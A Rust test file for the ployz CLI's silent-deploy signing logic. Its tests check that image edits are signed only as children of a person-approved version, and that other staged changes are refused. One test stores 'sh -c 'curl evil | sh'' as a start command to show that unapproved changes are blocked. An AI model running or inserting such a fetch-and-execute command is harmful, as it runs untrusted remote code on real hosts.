use std::collections::BTreeMap;

use ployz_core::authority::{
    Budget, Cap, CapSet, Grant, GrantKind, KeyPlaces, KeyScope, PasskeyApprover, PayloadDigest,
    ServiceVersion, Signed, Signer, SignerKey, Timestamp, TrustedGrant, TrustedKeys, VersionFacts,
    deploy::Creation, version,
};
use ployz_core::{
    ContainerKind, DeviceKey, Hint, Namespace, Region, RequestedServiceSpec, ResolvedUpdateConfig,
    RpcErrorCode, SealingPublicKey, ServiceId, ServiceName,
};
use ployz_store::{Parent, TagPin};
use serde_json::{Value, json};

use super::{ImageEdit, Refused, children, moves, pending, posted, refuse_forget};
use crate::device::DeviceSigning;

const P1: &str = "nginx@sha256:1111111111111111111111111111111111111111111111111111111111111111";
const P2: &str = "nginx@sha256:2222222222222222222222222222222222222222222222222222222222222222";
const CLUSTER: [u8; 32] = [9; 32];

fn person() -> Signer {
    Signer::from_seed(&[1; 32])
}

const CI_SEED: [u8; 32] = [2; 32];

fn namespace() -> Namespace {
    Namespace::parse("app").unwrap()
}

fn web() -> ServiceName {
    ServiceName::parse("web").unwrap()
}

fn spec_of(value: Value) -> RequestedServiceSpec {
    serde_json::from_value(value).unwrap()
}

/// `web` running `image` with `MODE` set to `mode`.
fn spec(image: &str, mode: &str) -> RequestedServiceSpec {
    spec_of(json!({
        "name": "web",
        "mode": {"mode": "replicated", "replicas": 1},
        "container": {"image": image, "pull_policy": "missing", "environment": {"MODE": mode}},
    }))
}

/// `web` running `image`, mounting the Provisioned Volume `data` born with `nonce`.
fn mounting(image: &str, nonce: &str) -> RequestedServiceSpec {
    spec_of(json!({
        "name": "web",
        "mode": {"mode": "replicated", "replicas": 1},
        "container": {"image": image, "pull_policy": "missing"},
        "volumes": [{"reference": "data", "source": {"kind": "provisioned", "name": "data",
            "maximum_bytes": 1_073_741_824_u64,
            "birth": {"namespace": "app", "name": "data", "made_at": 1_762_178_640_000_u64,
                "nonce": nonce}}}],
        "mounts": [{"volume": "data", "target": "/data"}],
    }))
}

/// The version a person approved of `approved`, which ran its tag `nginx:1` pinned to
/// its image.
fn root(approved: &RequestedServiceSpec) -> Signed<ServiceVersion> {
    let person = person();
    Signed::sign(
        &ServiceVersion {
            cluster: SealingPublicKey::from_bytes(CLUSTER),
            namespace: namespace(),
            service: web(),
            digest: PayloadDigest::of(approved, &namespace()).unwrap(),
            signed_at: Timestamp::from_millis(100_000).unwrap(),
            signer: SignerKey::Device(DeviceKey::from(person.public())),
            proposal: None,
            forget_older: false,
            parent: None,
        },
        &person,
    )
    .unwrap()
}

/// What Cloud says `web`'s parent is: `statement`, with `spec` as the spec it ran.
fn parents(
    statement: Signed<ServiceVersion>,
    spec: RequestedServiceSpec,
) -> BTreeMap<ServiceName, Parent> {
    let pin = TagPin {
        tag: "nginx:1".to_owned(),
        image: spec.container.image.clone(),
    };
    BTreeMap::from([(
        web(),
        Parent::Signed {
            statement,
            spec: Box::new(spec),
            pin: Some(pin),
        },
    )])
}

fn image(service: ServiceName, image: &str, pinned: &str) -> ImageEdit {
    ImageEdit {
        runtime: service.clone(),
        service,
        image: image.to_owned(),
        pinned: pinned.to_owned(),
    }
}

fn edit_to_nginx_2() -> Vec<ImageEdit> {
    vec![image(web(), "nginx:2", P2)]
}

/// Sign as the silent deploy does: `planned` is Cloud's plan, `parents` what Cloud says
/// each Service's parent is.
fn sign(
    planned: &[RequestedServiceSpec],
    parents: &BTreeMap<ServiceName, Parent>,
    edits: &[ImageEdit],
) -> Result<Vec<ployz_store::PostedVersion>, Refused> {
    let children = children((&namespace(), planned), parents, edits)?;
    let signing = DeviceSigning::from_seed(&CI_SEED);
    Ok(posted(children, &signing, Timestamp::from_millis(300_000).unwrap()).unwrap())
}

/// A Server trusting the person's Device, and the CI key for every Service in app.
fn server_trust() -> TrustedKeys {
    TrustedKeys::new(
        [DeviceKey::from(person().public())],
        [],
        [TrustedGrant {
            grant: Grant {
                key: Signer::from_seed(&CI_SEED).public(),
                kind: GrantKind::Ci,
                scope: KeyScope {
                    caps: CapSet::of(&[Cap::Spec]),
                    places: KeyPlaces::Only(vec![ployz_core::authority::KeyPlace {
                        environment: uuid::Uuid::nil(),
                        namespace: ployz_core::Namespace::parse("app").unwrap(),
                        service: None,
                    }]),
                },
                volumes: Vec::new(),
                issued_at: Timestamp::from_millis(1).unwrap(),
                name: None,
            },
            approved_by: PasskeyApprover::Server,
        }],
    )
}

/// What a Server says to creating `runs` under `versions`.
fn admit(
    versions: &[Signed<ServiceVersion>],
    runs: &RequestedServiceSpec,
) -> Result<version::VersionAdmitted, ployz_core::authority::AuthorityRefusal> {
    let resolved = runs
        .to_resolved(
            ServiceId::parse("c".repeat(32)).unwrap(),
            ResolvedUpdateConfig::default(),
        )
        .unwrap();
    version::verify(
        versions,
        &VersionFacts {
            cluster: Some(SealingPublicKey::from_bytes(CLUSTER)),
            trusted: &server_trust(),
            namespace: &namespace(),
            creation: Creation {
                service: &web(),
                kind: ContainerKind::ServiceContainer,
                spec: &resolved,
            },
        },
        &mut Budget::default(),
    )
}

fn deploy_matches(args: &[&str]) -> clap::ArgMatches {
    crate::cli::command()
        .try_get_matches_from(["ployz", "deploy"].iter().chain(args))
        .unwrap()
}

/// `refused` as `ployz deploy` with `args` reports it.
fn refusal(refused: Refused, args: &[&str]) -> crate::failure::Failure {
    let root = deploy_matches(args);
    refused.error(
        crate::handlers::leaf_matches(&root),
        crate::cli::Rerun::again(&root),
    )
}

#[test]
fn an_image_edit_is_signed_as_an_edit_of_the_version_a_person_approved_and_a_server_admits_it() {
    let approved = spec(P1, "a");
    let root = root(&approved);

    let [posted] = sign(
        &[spec("nginx:2", "a")],
        &parents(root.clone(), approved),
        &edit_to_nginx_2(),
    )
    .unwrap()
    .try_into()
    .unwrap();

    let body = posted.statement.open().unwrap();
    assert_eq!(body.parent, Some(root.open().unwrap().digest));
    assert_eq!(body.cluster, SealingPublicKey::from_bytes(CLUSTER));
    assert_eq!(
        posted.pin,
        Some(TagPin {
            tag: "nginx:2".to_owned(),
            image: P2.to_owned()
        })
    );
    let admitted = admit(&[posted.statement.clone(), root.clone()], &spec(P2, "a")).unwrap();
    assert_eq!(
        admitted.by.first().map(|by| by.floor_at),
        Some(root.open().unwrap().signed_at)
    );
    assert!(
        admit(&[posted.statement], &spec(P2, "a")).is_err(),
        "a Server refuses the edit without the version it edits"
    );
}

/// A Service `--image` doesn't name signs nothing: it ships under the versions already
/// kept for it, which may be an earlier edit, so its plan is never compared with the
/// version a person approved.
#[test]
fn a_service_with_no_image_edit_signs_nothing() {
    let approved = spec(P1, "a");
    let api = spec_of(json!({
        "name": "api",
        "mode": {"mode": "replicated", "replicas": 1},
        "container": {"image": "nginx:9", "pull_policy": "missing"},
    }));

    let signed = sign(
        &[spec("nginx:2", "a"), api],
        &parents(root(&approved), approved),
        &edit_to_nginx_2(),
    )
    .unwrap();

    assert_eq!(
        signed
            .iter()
            .map(|posted| posted.statement.open().unwrap().service)
            .collect::<Vec<_>>(),
        [web()]
    );
}

/// A renamed Service keeps the name its spec runs under, so `--image` addresses it by
/// its new name and the signer finds it by the old one.
#[test]
fn an_image_edit_of_a_renamed_service_signs_its_runtime_name() {
    let approved = spec(P1, "a");
    let edit = ImageEdit {
        service: ServiceName::parse("frontend").unwrap(),
        ..image(web(), "nginx:2", P2)
    };

    let [posted] = sign(
        &[spec("nginx:2", "a")],
        &parents(root(&approved), approved),
        &[edit],
    )
    .unwrap()
    .try_into()
    .unwrap();

    assert_eq!(posted.statement.open().unwrap().service, web());
}

#[test]
fn a_first_version_is_never_signed_without_a_person() {
    let missing = BTreeMap::from([(web(), Parent::Missing { deployed: false })]);

    let refused = sign(&[spec("nginx:2", "a")], &missing, &edit_to_nginx_2()).unwrap_err();

    assert_eq!(
        refused,
        Refused::NoParent {
            service: web(),
            deployed: false
        }
    );
    let error = refusal(refused, &["--yes"]);
    assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
}

#[test]
fn a_parent_spec_that_doesnt_match_what_the_person_signed_signs_nothing() {
    let root = root(&spec(P1, "a"));

    assert_eq!(
        sign(
            &[spec("nginx:2", "b")],
            &parents(root, spec(P1, "b")),
            &edit_to_nginx_2()
        ),
        Err(Refused::Forged(web()))
    );
}

#[test]
fn a_plan_that_swaps_a_volume_is_refused() {
    let approved = mounting(P1, "00112233445566778899aabbccddeeff");

    assert_eq!(
        sign(
            &[mounting("nginx:2", "ffeeddccbbaa99887766554433221100")],
            &parents(root(&approved), approved),
            &edit_to_nginx_2()
        ),
        Err(Refused::Mounts(web()))
    );
}

#[test]
fn a_plan_with_a_change_beyond_the_image_names_the_field_and_signs_nothing() {
    let approved = spec(P1, "a");

    assert_eq!(
        sign(
            &[spec("nginx:2", "b")],
            &parents(root(&approved), approved),
            &edit_to_nginx_2()
        ),
        Err(Refused::Differs {
            service: web(),
            field: "container.environment.MODE".to_owned(),
        })
    );
}

/// Cloud's plan runs another image than the one typed: the refusal never asks for the
/// --image the person already gave.
#[test]
fn a_plan_that_runs_another_image_than_the_one_typed_signs_nothing() {
    let approved = spec(P1, "a");

    let refused = sign(
        &[spec("nginx:3", "a")],
        &parents(root(&approved), approved),
        &edit_to_nginx_2(),
    )
    .unwrap_err();

    assert_eq!(
        refused,
        Refused::Replaced {
            service: web(),
            planned: "nginx:3".to_owned(),
        }
    );
    let error = refusal(refused, &["--yes", "--image", "web=nginx:2"]);
    assert!(
        !error.report().message.contains("--image."),
        "{}",
        error.report().message
    );
    assert!(error.hints().is_empty(), "{:?}", error.hints());
}

/// What the Store's plan lists as staged once `edits` are written over `web` (nginx:1) and
/// `api` (caddy:2), both deployed: the changes a silent deploy reads.
fn staged_by_store(edits: &[(&str, Value)]) -> Vec<ployz_store::NodeChange> {
    use ployz_store::{
        Actor, Admit, Change, Command, ConfigStore, CreateProject, CreateService, Deploy,
        DeploymentId, Edit, EnvironmentId, EnvironmentRef, OrganizationId, PlanQuery, ProjectId,
        ProjectName, RunEvidence, RunnerId, SealingKey, ServiceLineageId, SettingPath, Trusted,
    };
    let store = ConfigStore::open(
        "sqlite::memory:",
        SealingKey::new(b"test-encryption-secret").unwrap(),
    )
    .unwrap();
    let who = Actor::system(OrganizationId::parse("org").unwrap());
    store
        .write(
            &who,
            &CreateProject {
                id: ProjectId::parse("00000000-0000-4000-8000-000000000001").unwrap(),
                name: ProjectName::parse("shop").unwrap(),
                default_environment: EnvironmentId::parse("00000000-0000-4000-8000-000000000002")
                    .unwrap(),
                region: None,
            },
        )
        .unwrap();
    for (n, name, image) in [(3, "web", "nginx:1"), (4, "api", "caddy:2")] {
        store
            .write(
                &who,
                &CreateService {
                    id: ServiceLineageId::parse(format!("00000000-0000-4000-8000-00000000000{n}"))
                        .unwrap(),
                    environment: EnvironmentRef::default(),
                    name: ServiceName::parse(name).unwrap(),
                    image: Some(image.into()),
                    template: None,
                },
            )
            .unwrap();
    }
    let id = DeploymentId::parse("00000000-0000-4000-8000-000000000101").unwrap();
    store
        .write_trusted(
            &who,
            &Admit::Deploy(Deploy {
                id: id.clone(),
                environment: EnvironmentRef::default(),
                services: Vec::new(),
                version: None,
                upload: None,
                accept_volume_loss: Vec::new(),
                message: None,
                prune: false,
                no_prune: false,
                versions: Vec::new(),
                copies: Vec::new(),
                recreate: Vec::new(),
                rule: None,
            }),
            &Trusted::default(),
        )
        .unwrap();
    let runner = RunnerId::parse("runner").unwrap();
    let claimed = store.claim(&id, &runner).unwrap();
    let operation = |index: usize| {
        json!({"type": "remove_container", "machine_id": "a".repeat(32),
               "container_id": format!("{index:064x}")})
    };
    let preview = serde_json::from_value(json!({
        "namespace": claimed.intent.namespace,
        "operations": claimed.intent.target.iter().enumerate().map(|(index, spec)| json!({
            "index": index, "machine_id": "a".repeat(32), "service_name": spec.name,
            "operation": operation(index), "status": {"type": "pending"}
        })).collect::<Vec<_>>(),
        "warnings": [], "would_remove": [], "preserved_volumes": []
    }))
    .unwrap();
    store
        .record(&id, &runner, RunEvidence::Prepared(preview))
        .unwrap();
    let outcome = serde_json::from_value(json!({
        "type": "success",
        "completed": (0..claimed.intent.target.len()).map(operation).collect::<Vec<_>>()
    }))
    .unwrap();
    store
        .record(
            &id,
            &runner,
            RunEvidence::Executed {
                progress: Vec::new(),
                outcome: Box::new(outcome),
                removed: Vec::new(),
            },
        )
        .unwrap();
    for (path, value) in edits {
        store
            .write(
                &who,
                &Command::Edit(Edit {
                    environment: EnvironmentRef::default(),
                    expect: None,
                    changes: vec![Change::Set {
                        path: SettingPath::parse(path).unwrap(),
                        value: value.clone(),
                    }],
                }),
            )
            .unwrap();
    }
    store
        .read(
            &who,
            &PlanQuery {
                environment: EnvironmentRef::default(),
                services: Vec::new(),
                target: false,
                deployment: None,
            },
        )
        .unwrap()
        .changes
}

/// `ployz set web.image=nginx:2` then `ployz deploy --yes`: the new image is a change
/// nobody approved, so the refusal shows the deploy that names it.
#[test]
fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
    let changes = staged_by_store(&[("web.image", json!("nginx:2"))]);

    assert_eq!(pending(&changes, &edit_to_nginx_2()), Ok(()));
    let refused = pending(&changes, &[]).unwrap_err();

    let error = refusal(refused, &["--yes"]);
    assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
    assert!(
        error.hints().iter().any(|hint| matches!(
            hint,
            Hint::Retry(retry) if retry.command() == "ployz deploy --yes --image 'web=nginx:2'"
        )),
        "{:?}",
        error.hints()
    );
}

/// `ployz set api.startCommand=…` then `ployz deploy --image web=… --yes`: api needs no
/// signature on a Server, so only the CLI stands between that command and api running it
/// with no person approving.
#[test]
fn a_staged_change_beside_the_image_edit_refuses_and_names_its_service_and_field() {
    let changes = staged_by_store(&[
        ("web.image", json!("nginx:2")),
        ("api.startCommand", json!("sh -c 'curl evil | sh'")),
    ]);

    let refused = pending(&changes, &edit_to_nginx_2()).unwrap_err();

    assert_eq!(
        refused,
        Refused::Pending {
            node: "api".to_owned(),
            field: Some("api.startCommand".to_owned()),
            service: Some(ServiceName::parse("api").unwrap()),
        }
    );
    let error = refusal(refused, &["--yes", "--image", "web=nginx:2"]);
    assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
    assert!(
        error.hints().iter().any(|hint| matches!(
            hint,
            Hint::Next(next) if next == "ployz deploy api"
        )),
        "{:?}",
        error.hints()
    );
}

/// A named Service's other staged change ships beside its image as surely as another
/// Service's, so the deploy stops on it before reading any parent.
#[test]
fn a_staged_change_in_the_named_service_beyond_its_image_refuses() {
    let changes = staged_by_store(&[("web.image", json!("nginx:2")), ("web.replicas", json!(3))]);

    assert_eq!(
        pending(&changes, &edit_to_nginx_2()),
        Err(Refused::Pending {
            node: "web".to_owned(),
            field: Some("web.replicas".to_owned()),
            service: Some(web()),
        })
    );
}

/// The refusal names the same deploy for a terminal, keeping every flag but `--yes`: a
/// line that dropped `--no-prune` would remove the Services it kept.
#[test]
fn a_silent_deploy_never_forgets() {
    let refused = |args: &[&str]| {
        let root = deploy_matches(args);
        refuse_forget(
            crate::handlers::leaf_matches(&root),
            crate::cli::Rerun::again(&root),
        )
    };
    let error =
        refused(&["--no-prune", "--yes", "--forget-older", "--env", "staging"]).unwrap_err();

    assert_eq!(error.report().code, RpcErrorCode::ConfirmationRequired);
    assert_eq!(
        error.hints(),
        [crate::cli::retry_hint(
            "ployz deploy --no-prune --forget-older --env staging"
        )]
    );
    assert!(refused(&["--yes"]).is_ok());
}

/// A staged region moves a Service no silent signer reviewed, so the deploy waits for a
/// person even when every node change is the named image.
#[test]
fn a_staged_region_move_refuses_and_names_the_service() {
    let service = ServiceName::parse("api").expect("service name");
    let region = Region::parse("eu").expect("region");
    let regions = BTreeMap::from([(service.clone(), Some(region))]);

    assert_eq!(moves(&BTreeMap::new()), Ok(()));
    assert_eq!(
        moves(&regions),
        Err(Refused::Pending {
            node: "api".to_owned(),
            field: Some("region".to_owned()),
            service: Some(service),
        })
    );
}

/// A retry keeps every argument typed, `--yes`, the config and the Environment with it,
/// and adds the image the refusal names.
#[test]
fn a_named_image_retry_keeps_the_config_the_environment_and_yes() {
    let dir = tempfile::tempdir().unwrap();
    let config = dir.path().join("a b.yaml");
    std::fs::write(&config, "").unwrap();
    let config = config.to_str().unwrap();
    let root = crate::cli::command()
        .try_get_matches_from([
            "ployz",
            "--ployz-config",
            config,
            "deploy",
            "web",
            "--env",
            "staging",
            "--yes",
        ])
        .unwrap();
    let refused = Refused::Unnamed {
        service: web(),
        image: "nginx:2".to_owned(),
    };
    let refusal = refused
        .error(
            crate::handlers::leaf_matches(&root),
            crate::cli::Rerun::again(&root),
        )
        .report();
    assert_eq!(
        refusal
            .details
            .get("retry")
            .and_then(serde_json::Value::as_str),
        Some(
            format!(
                "ployz --ployz-config '{config}' deploy web --env staging --yes \
                 --image 'web=nginx:2'"
            )
            .as_str()
        )
    );
}
